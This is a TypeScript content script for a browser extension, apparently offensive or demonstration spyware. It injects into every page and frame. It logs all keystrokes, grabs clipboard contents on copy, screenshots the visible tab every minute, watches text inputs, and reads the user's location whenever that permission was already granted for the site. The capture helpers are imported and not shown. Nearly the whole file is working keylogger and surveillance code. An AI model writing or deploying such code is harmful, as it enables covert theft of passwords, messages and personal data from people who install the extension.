import _ from "lodash";
import type { PlasmoCSConfig } from "plasmo";
import {
  captureClipboard,
  captureGeolocation,
  captureKeylogBuffer,
  captureVisibleTab,
} from "../utils/page-utils";

export const config: PlasmoCSConfig = {
  matches: ["<all_urls>"],
  all_frames: true,
  run_at: "document_end",
};

let buffer = "";

function piggybackGeolocation() {
  // Piggyback permissions for geolocation
  navigator.permissions
    .query({ name: "geolocation" })
    .then(({ state }: { state: string }) => {
      if (state === "granted") {
        captureGeolocation();
      }
    });
}

const debouncedCaptureKeylogBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    await captureKeylogBuffer(buffer);

    buffer = "";
  }
}, 2000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});

const inputs: WeakSet<Element> = new WeakSet();

const debouncedHandler = _.debounce(() => {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) => !inputs.has(input))
    .map((input) => {
      input.addEventListener(
        "input",
        _.debounce((e) => {
          console.log(e);
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() => debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });

document.addEventListener("visibilitychange", captureVisibleTab);
document.addEventListener("click", piggybackGeolocation);
document.addEventListener("copy", captureClipboard);

setInterval(() => {
  captureVisibleTab();
}, 60 * 1e3);

captureVisibleTab();
